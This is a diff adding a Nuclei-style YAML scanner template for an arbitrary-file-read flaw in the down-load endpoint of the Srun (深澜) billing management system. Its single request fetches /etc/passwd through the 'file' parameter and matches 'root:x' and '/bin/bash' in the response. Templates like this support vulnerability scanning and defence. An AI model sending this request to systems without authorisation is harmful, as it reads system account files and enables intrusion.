@@ -1,0 +1,21 @@
+id: poc-yaml-srun-down-load-anyfile-read
+info:
+  name: "深澜计费管理系统 down-load 接口任意文件读取"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 深澜计费管理系统
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/user/group/down-load?file=/etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        words:
+        - root:x
+        - /bin/bash
+        condition: and
+        part: body
